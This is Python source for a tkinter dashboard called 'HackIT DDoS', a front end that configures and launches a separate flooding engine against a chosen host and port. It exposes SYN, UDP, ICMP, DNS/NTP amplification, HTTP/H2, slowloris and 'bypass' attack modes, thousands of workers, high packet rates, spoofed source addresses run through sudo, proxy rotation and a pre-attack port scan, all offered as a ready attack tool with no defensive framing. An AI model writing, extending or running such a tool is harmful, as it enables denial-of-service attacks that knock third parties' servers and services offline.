"""
HackIT DDoS — GUI Dashboard
tkinter-based graphical interface with dark professional theme.
"""

import os, sys, json, time, re, tempfile, subprocess, threading, queue
import tkinter as tk
from tkinter import ttk, scrolledtext
from pathlib import Path
from datetime import datetime

ENGINE_DIR = Path(__file__).parent
GO_BINARY = ENGINE_DIR / "engine_ddos"
C_DIR = ENGINE_DIR / "c"

ANSI_RE = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')

# Colors
DARK = "#0a0e14"
MID = "#111820"
CARD = "#151d28"
CARD2 = "#18222e"
WHITE = "#e6eef5"
GREEN = "#4ae08a"
RED = "#f05050"
YELLOW = "#f0c040"
CYAN = "#40c0f0"
BLUE = "#5090f0"
DIM = "#607080"
ORANGE = "#f09040"
PURPLE = "#b080f0"
BORDER = "#1e2a36"

FONT = "Monospace" if sys.platform == "linux" else "Consolas"


class AttackConfig:
    def __init__(self):
        self.target = ""
        self.port = 80
        self.method = "all"
        self.time = 60
        self.rate = 500000
        self.threads = 1024
        self.mask = False
        self.spoof = False
        self.jitter = 0
        self.size = 1024
        self.verbose = True
        self.proxy = ""
        self.tor = False
        self.mix = "25:25:25:25"
        self.pattern = "square"
        self.recon = True

    def to_go_cfg(self, spoof_pool):
        ko_modes = ("all", "kill", "land", "slowloris", "amp", "mix")
        is_all = self.method in ko_modes
        capped_w = min(self.threads, 4096)
        return {
            "target": self.target, "port": self.port,
            "method": self.method, "workers": capped_w,
            "rate_limit": self.rate, "duration": self.time,
            "spoof_ip": spoof_pool[0] if spoof_pool and self.spoof else "",
            "spoof_pool": spoof_pool if self.spoof else [],
            "proxy_list": [], "mask": self.mask,
            "jitter": self.jitter, "interfaces": [],
            "auto_switch": is_all, "adaptive_rate": is_all,
            "core_pin": False, "xdp_enable": False, "dpdk_enable": False,
            "h2_concurrent_streams": 500, "dpi_fragment_count": 4,
            "mix_ratio": self.mix if self.method in ("kill", "all", "mix") else "25:25:25:25",
            "method_list": ['syn','udp','ack','rst','icmp','dns','ntp',
                           'http','h2','bypass'] if is_all else [],
            "tor_proxy": "", "recon": self.recon, "pattern": self.pattern,
        }


class AttackThread(threading.Thread):
    def __init__(self, cfg, on_stats, on_stderr, on_done, on_error):
        super().__init__(daemon=True)
        self.cfg = cfg
        self.on_stats = on_stats
        self.on_stderr = on_stderr
        self.on_done = on_done
        self.on_error = on_error
        self._stop = threading.Event()
        self.process = None

    def stop(self):
        self._stop.set()
        if self.process:
            self.process.kill()

    def stopped(self):
        return self._stop.is_set()

    def run(self):
        spoof_pool = [f"{i}.{i}.{i}.{i}" for i in range(1, 101)] if self.cfg.spoof else []
        go_cfg = self.cfg.to_go_cfg(spoof_pool)
        fd, path = tempfile.mkstemp(suffix=".json", prefix="ddos_gui_")
        try:
            with os.fdopen(fd, "w") as f:
                json.dump(go_cfg, f)
            env = os.environ.copy()
            lib_path = str(C_DIR / "build") + ":" + env.get("LD_LIBRARY_PATH", "")
            env["LD_LIBRARY_PATH"] = lib_path
            cmd = [str(GO_BINARY), path]
            if self.cfg.spoof:
                cmd = ["sudo", "-E", "env", f"LD_LIBRARY_PATH={lib_path}"] + cmd
            self.process = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                text=True, bufsize=1, env=env if not self.cfg.spoof else None
            )

            def read_stderr():
                for line in iter(self.process.stderr.readline, ""):
                    self.on_stderr(line.rstrip())
            stderr_thread = threading.Thread(target=read_stderr, daemon=True)
            stderr_thread.start()

            for line in iter(self.process.stdout.readline, ""):
                if self.stopped():
                    break
                line = line.strip()
                if line.startswith("{"):
                    try:
                        self.on_stats(json.loads(line))
                    except json.JSONDecodeError:
                        pass
            self.process.wait()
            self.on_done()
        except Exception as e:
            self.on_error(str(e))
        finally:
            try:
                os.unlink(path)
            except (OSError, PermissionError):
                pass


class HackITGUI:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("HackIT DDoS — Multi-Vector Attack Suite")
        self.root.geometry("1200x800")
        self.root.configure(bg=DARK)
        self.root.minsize(960, 640)

        self.attack_thread = None
        self.start_time = None
        self.peak_rate = 0
        self.total_sent = 0
        self.stats_updates = 0
        self.stats_queue = queue.Queue()
        self.completed = False
        self.last_stat = {}
        self.attack_history = []

        self._build_ui()
        self._bind_shortcuts()
        self._poll_stats()
        self.root.protocol("WM_DELETE_WINDOW", self._on_close)

    def _bind_shortcuts(self):
        self.root.bind("<Control-r>", lambda e: self._run_attack())
        self.root.bind("<Control-s>", lambda e: self._stop_attack())
        self.root.bind("<Control-q>", lambda e: self._on_close())
        self.root.bind("<F5>", lambda e: self._run_attack())
        self.root.bind("<Escape>", lambda e: self._stop_attack())
        self.root.bind("<Control-l>", lambda e: self._clear_output())

    def _section(self, parent, text, color=YELLOW):
        f = tk.Frame(parent, bg=CARD)
        f.pack(fill="x", pady=(0, 6))
        tk.Label(f, text=text, font=(FONT, 10, "bold"),
                 fg=color, bg=CARD).pack(anchor="w", padx=8, pady=4)
        return f

    def _sep(self, parent):
        tk.Frame(parent, height=1, bg=BORDER).pack(fill="x", pady=4)

    def _build_ui(self):
        # ── HEADER ──
        hdr = tk.Frame(self.root, bg=MID, height=52)
        hdr.pack(fill="x")
        hdr.pack_propagate(False)

        tk.Label(hdr, text="⚡ HACKIT  DDoS  ⚡",
                 font=(FONT, 18, "bold"), fg=RED, bg=MID
                 ).pack(side="left", padx=(18, 6), pady=6)
        tk.Label(hdr, text="v2.1  •  Multi-Vector Attack Suite",
                 font=(FONT, 9), fg=DIM, bg=MID
                 ).pack(side="left", pady=6)
        self.status_label = tk.Label(hdr, text="● IDLE",
                                     font=(FONT, 11, "bold"), fg=GREEN, bg=MID)
        self.status_label.pack(side="right", padx=(0, 18), pady=6)

        tk.Frame(self.root, height=1, bg=BORDER).pack(fill="x")

        # ── BODY ──
        body = tk.Frame(self.root, bg=DARK)
        body.pack(fill="both", expand=True, padx=8, pady=6)
        body.columnconfigure(0, weight=0, minsize=360)
        body.columnconfigure(1, weight=1)
        body.rowconfigure(0, weight=1)

        # ── LEFT: Controls ──
        left = tk.Frame(body, bg=CARD, highlightbackground=BORDER,
                        highlightthickness=1)
        left.grid(row=0, column=0, sticky="nsew", padx=(0, 5))

        canvas = tk.Canvas(left, bg=CARD, bd=0, highlightthickness=0)
        scroll = ttk.Scrollbar(left, orient="vertical", command=canvas.yview)
        sf = tk.Frame(canvas, bg=CARD)
        sf.bind("<Configure>", lambda e: canvas.configure(
            scrollregion=canvas.bbox("all")))
        canvas.create_window((0, 0), window=sf, anchor="nw")
        canvas.configure(yscrollcommand=scroll.set)
        canvas.pack(side="left", fill="both", expand=True)
        scroll.pack(side="right", fill="y")

        self._build_controls(sf)

        # ── RIGHT: Output ──
        right = tk.Frame(body, bg=CARD, highlightbackground=BORDER,
                         highlightthickness=1)
        right.grid(row=0, column=1, sticky="nsew")

        oh = tk.Frame(right, bg=MID, height=30)
        oh.pack(fill="x")
        oh.pack_propagate(False)
        tk.Label(oh, text="⏺  LIVE OUTPUT",
                 font=(FONT, 9, "bold"), fg=CYAN, bg=MID
                 ).pack(side="left", padx=10)
        for lbl, cb in [("⛶ clear", self._clear_output),
                         ("⤒ top", self._scroll_top),
                         ("⤓ auto", self._toggle_autoscroll)]:
            lb = tk.Label(oh, text=lbl, font=(FONT, 8), fg=DIM, bg=MID,
                          cursor="hand2")
            lb.pack(side="right", padx=6)
            lb.bind("<Button-1>", lambda e, c=cb: c())

        self.output = scrolledtext.ScrolledText(
            right, bg="#0c1420", fg=WHITE, font=(FONT, 9),
            insertbackground=GREEN, bd=0, padx=10, pady=6,
            state="normal", wrap="word", height=20,
            highlightbackground=BORDER, highlightthickness=0
        )
        self.output.pack(fill="both", expand=True)
        self.autoscroll = True
        self._tag_output()

        # ── STATS BAR ──
        self._build_stats_bar()

        # ── SHORTCUTS HINT ──
        hint = tk.Frame(self.root, bg="#060a0e", height=20)
        hint.pack(fill="x")
        hint.pack_propagate(False)
        tk.Label(hint, text="Ctrl+R Run  |  Ctrl+S / Esc Stop  |  Ctrl+L Clear  |  Ctrl+Q Quit",
                 font=(FONT, 7), fg="#303a44", bg="#060a0e"
                 ).pack(pady=2)

    def _tag_output(self):
        for tag, color in [("green", GREEN), ("red", RED), ("yellow", YELLOW),
                            ("cyan", CYAN), ("dim", DIM), ("orange", ORANGE)]:
            self.output.tag_configure(tag, foreground=color)
        self.output.tag_configure("bold", font=(FONT, 9, "bold"))

    def _build_stats_bar(self):
        bar = tk.Frame(self.root, bg=MID, height=36)
        bar.pack(fill="x")
        bar.pack_propagate(False)

        metrics = [
            ("sent", "SENT", GREEN),
            ("rate", "RATE/s", YELLOW),
            ("peak", "PEAK", ORANGE),
            ("errors", "ERRORS", RED),
            ("elapsed", "TIME", CYAN),
            ("method", "METHOD", PURPLE),
        ]
        self.stats_labels = {}
        for key, label, color in metrics:
            f = tk.Frame(bar, bg=MID)
            f.pack(side="left", expand=True, fill="x")
            tk.Label(f, text=label, font=(FONT, 7),
                     fg=DIM, bg=MID).pack()
            lb = tk.Label(f, text="0", font=(FONT, 11, "bold"),
                          fg=color, bg=MID)
            lb.pack()
            self.stats_labels[key] = lb

        # Progress bar
        self.progress = ttk.Progressbar(bar, mode="determinate",
                                         length=120)
        self.progress.pack(side="right", padx=12, pady=6)

    def _make_entry(self, parent, label, default="", width=16, tooltip=""):
        row = tk.Frame(parent, bg=CARD)
        row.pack(fill="x", pady=1)
        lb = tk.Label(row, text=label, font=(FONT, 8),
                      fg=DIM, bg=CARD, width=13, anchor="w")
        lb.pack(side="left", padx=(8, 0))
        ent = tk.Entry(row, font=(FONT, 9), fg=WHITE,
                       bg="#0d1420", bd=0, insertbackground=GREEN,
                       relief="flat", width=width,
                       highlightbackground=BORDER, highlightthickness=1)
        ent.pack(side="left", padx=4, ipady=2, ipadx=4)
        ent.insert(0, default)
        if tooltip:
            self._tooltip(lb, tooltip)
            self._tooltip(ent, tooltip)
        return ent

    def _tooltip(self, widget, text):
        tip = None
        def enter(e):
            nonlocal tip
            if tip: return
            tip = tk.Toplevel(widget)
            tip.wm_overrideredirect(True)
            x = min(widget.winfo_rootx() + 16,
                    widget.winfo_screenwidth() - 300)
            y = widget.winfo_rooty() + 24
            tip.wm_geometry(f"+{x}+{y}")
            tk.Label(tip, text=text, font=(FONT, 8),
                     fg=WHITE, bg="#202830", padx=8, pady=4,
                     bd=1, relief="solid", highlightbackground="#304050"
                     ).pack()
        def leave(e):
            nonlocal tip
            if tip:
                tip.destroy()
                tip = None
        widget.bind("<Enter>", enter)
        widget.bind("<Leave>", leave)

    def _build_controls(self, parent):
        # ── TARGET ──
        self._section(parent, "🎯  TARGET", RED)
        self.target_entry = self._make_entry(
            parent, "Host/IP", "example.com",
            tooltip="Target IP address or domain name")

        # ── CONFIG ──
        self._section(parent, "⚙  CONFIGURATION", YELLOW)
        self.port_entry = self._make_entry(parent, "Port", "80")
        self.time_entry = self._make_entry(parent, "Duration (s)", "60")
        self.threads_entry = self._make_entry(parent, "Workers", "1024",
            tooltip="Concurrent threads (max 4096)")
        self.rate_entry = self._make_entry(parent, "Rate (pps)", "500000")

        # Mode
        row = tk.Frame(parent, bg=CARD)
        row.pack(fill="x", pady=1)
        tk.Label(row, text="Mode", font=(FONT, 8), fg=DIM,
                 bg=CARD, width=13, anchor="w"
                 ).pack(side="left", padx=(8, 0))
        self.mode_var = tk.StringVar(value="all")
        self.mode_menu = ttk.Combobox(
            row, textvariable=self.mode_var, width=16, font=(FONT, 9),
            values=["all","kill","syn","udp","ack","rst","icmp","dns",
                    "ntp","http","https","h2","bypass","land","slowloris",
                    "amp","mix"])
        self.mode_menu.pack(side="left", padx=4)
        self.mode_menu.bind("<<ComboboxSelected>>", self._on_mode_change)
        self._tooltip(self.mode_menu, "Attack vector / method")

        # Mix
        row = tk.Frame(parent, bg=CARD)
        row.pack(fill="x", pady=1)
        tk.Label(row, text="Mix (U:S:H:A)", font=(FONT, 8), fg=DIM,
                 bg=CARD, width=13, anchor="w"
                 ).pack(side="left", padx=(8, 0))
        self.mix_entry = tk.Entry(row, font=(FONT, 9), fg=WHITE,
            bg="#0d1420", bd=0, relief="flat", width=16,
            highlightbackground=BORDER, highlightthickness=1,
            disabledbackground="#0d1420", disabledforeground=DIM)
        self.mix_entry.pack(side="left", padx=4, ipady=2, ipadx=4)
        self.mix_entry.insert(0, "25:25:25:25")
        self._tooltip(self.mix_entry, "Ratio UDP:SYN:HTTP:AMP (for kill/all/mix)")

        # ── OPTIONS ──
        self._section(parent, "🔧  OPTIONS", CYAN)
        chk_style = {"font": (FONT, 8), "fg": CYAN, "bg": CARD,
                      "selectcolor": DARK, "activebackground": CARD,
                      "activeforeground": CYAN}
        self.spoof_var = tk.BooleanVar(value=False)
        tk.Checkbutton(parent, text="IP Spoofing  (root required)",
                       variable=self.spoof_var, **chk_style
                       ).pack(anchor="w", padx=12, pady=1)
        self.mask_var = tk.BooleanVar(value=False)
        tk.Checkbutton(parent, text="Proxy Rotation",
                       variable=self.mask_var, **chk_style
                       ).pack(anchor="w", padx=12, pady=1)
        self.recon_var = tk.BooleanVar(value=True)
        tk.Checkbutton(parent, text="Pre-attack Port Scan",
                       variable=self.recon_var, **chk_style
                       ).pack(anchor="w", padx=12, pady=1)
        self.pattern_var = tk.StringVar(value="square")
        row = tk.Frame(parent, bg=CARD)
        row.pack(fill="x", pady=1)
        tk.Label(row, text="Pattern", font=(FONT, 8), fg=DIM,
                 bg=CARD, width=13, anchor="w"
                 ).pack(side="left", padx=(8, 0))
        tk.Entry(row, textvariable=self.pattern_var, font=(FONT, 9),
                 fg=WHITE, bg="#0d1420", bd=0, relief="flat",
                 width=8, highlightbackground=BORDER, highlightthickness=1
                 ).pack(side="left", padx=4, ipady=2, ipadx=4)

        # ── HISTORY ──
        self._section(parent, "📋  ATTACK LOG", GREEN)
        self.history_list = tk.Listbox(parent, bg="#0d1420", fg=DIM,
                                        font=(FONT, 8), bd=0,
                                        highlightbackground=BORDER,
                                        highlightthickness=1,
                                        height=5, relief="flat")
        self.history_list.pack(fill="x", padx=8, pady=2)
        self.history_list.bind("<Double-Button-1>", self._history_click)

        # ── BUTTONS ──
        self._sep(parent)
        btn_row = tk.Frame(parent, bg=CARD)
        btn_row.pack(fill="x", padx=8, pady=(6, 10))

        self.run_btn = tk.Button(
            btn_row, text="▶  RUN ATTACK",
            font=(FONT, 10, "bold"), bg="#18a048", fg="white", bd=0,
            activebackground="#28c060", activeforeground="white",
            padx=10, pady=7, cursor="hand2",
            command=self._run_attack)
        self.run_btn.pack(side="left", fill="x", expand=True, padx=(0, 3))

        self.stop_btn = tk.Button(
            btn_row, text="■  STOP",
            font=(FONT, 10, "bold"), bg="#882020", fg="white", bd=0,
            activebackground="#aa3030", activeforeground="white",
            padx=10, pady=7, cursor="hand2", state="disabled",
            command=self._stop_attack)
        self.stop_btn.pack(side="left", fill="x", expand=True, padx=(3, 0))

        self.info_label = tk.Label(
            parent, text="Ready — set target and press RUN",
            font=(FONT, 8), fg=DIM, bg=CARD, wraplength=320)
        self.info_label.pack(anchor="w", padx=12, pady=(0, 8))

    def _on_mode_change(self, e=None):
        mode = self.mode_var.get()
        self.mix_entry.config(state="normal" if mode in ("all","kill","mix") else "disabled")

    def _log(self, text, color=WHITE, tag=None):
        self.output.config(state="normal")
        if tag is None:
            tag = color if color in ("green","red","yellow","cyan","dim","orange") else "fg"
        ts = datetime.now().strftime("%H:%M:%S")
        self.output.insert("end", f"[{ts}] {text}\n", tag)
        if self.autoscroll:
            self.output.see("end")
        self.output.config(state="disabled")

    def _clear_output(self):
        self.output.config(state="normal")
        self.output.delete(1.0, "end")
        self.output.config(state="disabled")

    def _scroll_top(self):
        self.output.see("1.0")

    def _toggle_autoscroll(self):
        self.autoscroll = not self.autoscroll

    def _history_click(self, e):
        sel = self.history_list.curselection()
        if sel:
            text = self.history_list.get(sel[0])
            self._log(f"⏪ Restore: {text}", "dim")

    def _run_attack(self):
        if self.attack_thread and self.attack_thread.is_alive():
            self._log("Attack already running", "yellow")
            return

        target = self.target_entry.get().strip()
        if not target:
            self._log("ERROR: No target set", "red")
            return

        cfg = AttackConfig()
        cfg.target = target
        try:
            cfg.port = int(self.port_entry.get() or 80)
            cfg.time = max(1, int(self.time_entry.get() or 60))
            cfg.threads = max(1, min(int(self.threads_entry.get() or 1024), 4096))
            cfg.rate = max(1, int(self.rate_entry.get() or 500000))
        except ValueError:
            self._log("ERROR: Invalid numeric value", "red")
            return
        cfg.method = self.mode_var.get()
        cfg.spoof = self.spoof_var.get()
        cfg.mask = self.mask_var.get()
        cfg.recon = self.recon_var.get()
        cfg.mix = self.mix_entry.get().strip() or "25:25:25:25"
        cfg.pattern = self.pattern_var.get().strip() or "square"

        # Log config
        self._log(f"▶  Attack START  —  {cfg.method.upper()}  →  {cfg.target}:{cfg.port}", "green")
        self._log(f"    Workers {cfg.threads}  |  {cfg.time}s  |  {cfg.rate:,} pps  |  pattern={cfg.pattern}", "dim")
        if cfg.spoof: self._log("    IP Spoofing: ON  (needs root)", "cyan")
        if cfg.mask:  self._log("    Proxy Rotation: ON", "cyan")
        if cfg.recon: self._log("    Pre-attack port scan: ON", "cyan")

        # Record history
        entry = f"{cfg.method.upper()} → {cfg.target}:{cfg.port} [{cfg.time}s]"
        self.attack_history.append(entry)
        self.history_list.insert(0, entry)
        self.history_list.selection_clear(0, "end")

        self.status_label.config(text="● RUNNING", fg=RED)
        self.run_btn.config(state="disabled", bg="#205030")
        self.stop_btn.config(state="normal")
        self.progress["value"] = 0
        self.info_label.config(text=f"Attacking {target}:{cfg.port} — {cfg.method.upper()}")

        self.start_time = time.time()
        self.peak_rate = 0
        self.total_sent = 0
        self.stats_updates = 0
        self.completed = False
        self.last_stat = {}

        self.attack_thread = AttackThread(
            cfg=cfg,
            on_stats=lambda d: self.stats_queue.put(d),
            on_stderr=lambda line: self._log(line, "dim") if line.strip() else None,
            on_done=self._on_done,
            on_error=self._on_error,
        )
        self.attack_thread.start()

    def _stop_attack(self):
        if self.attack_thread and self.attack_thread.is_alive():
            self.completed = True
            self.attack_thread.stop()
            self._log("■  Attack STOPPED by user", "yellow")
            self._finish_attack(aborted=True)

    def _poll_stats(self):
        """Throttled stat updates — drain queue and update UI at most 8 Hz."""
        try:
            while True:
                data = self.stats_queue.get_nowait()
                self.last_stat = data
        except queue.Empty:
            pass

        if self.last_stat and self.attack_thread and self.attack_thread.is_alive():
            d = self.last_stat
            sent = d.get("sent", 0)
            rate = d.get("rate", 0)
            method = d.get("method", "?")
            errors = d.get("errors", 0)
            self.peak_rate = max(self.peak_rate, rate)
            self.total_sent = sent

            now = time.time()
            elapsed = int(now - self.start_time) if self.start_time else 0
            remaining = max(0, (self.last_stat.get("duration", 60) or 60) - elapsed)
            pct = min(100, int((elapsed / max(1, self.last_stat.get("duration", 60))) * 100))

            self.stats_labels["sent"].config(text=f"{sent:,}" if sent else "0")
            self.stats_labels["rate"].config(text=f"{rate:,}/s" if rate else "0")
            self.stats_labels["peak"].config(text=f"{self.peak_rate:,}/s")
            self.stats_labels["errors"].config(text=str(errors))
            self.stats_labels["elapsed"].config(
                text=f"{elapsed}s / {remaining}s" if remaining > 0 else f"{elapsed}s")
            self.stats_labels["method"].config(text=method.upper())
            self.progress["value"] = pct

            self.stats_updates += 1
            if self.stats_updates % 8 == 0:
                self._log(f"📦  {sent:,} pkts  |  {rate:,}/s  |  peak {self.peak_rate:,}/s  |  {method}",
                         "dim")
        elif not self.attack_thread or not self.attack_thread.is_alive():
            self.progress["value"] = 100

        self.root.after(125, self._poll_stats)

    def _on_done(self):
        if self.completed:
            return
        self.completed = True
        self._finish_attack(aborted=False)

    def _on_error(self, msg):
        self._log(f"✗  ERROR: {msg}", "red")
        self._finish_attack(aborted=True)

    def _finish_attack(self, aborted=False):
        self.attack_thread = None
        elapsed = int(time.time() - self.start_time) if self.start_time else 0

        if not aborted:
            total = self.total_sent
            self._log(f"✓  Attack COMPLETE", "bold")
            self._log(f"    {total:,} packets sent  |  {elapsed}s  |  peak {self.peak_rate:,}/s", "green")
            self._log("─" * 50, "dim")

        self.status_label.config(text="● IDLE", fg=GREEN)
        self.run_btn.config(state="normal", bg="#18a048")
        self.stop_btn.config(state="disabled")
        self.info_label.config(text="Done. Configure next target and press RUN")

    def _on_close(self):
        if self.attack_thread and self.attack_thread.is_alive():
            self.attack_thread.stop()
        self.root.destroy()

    def run(self):
        self.root.mainloop()


def launch_gui():
    app = HackITGUI()
    app.run()


if __name__ == "__main__":
    launch_gui()
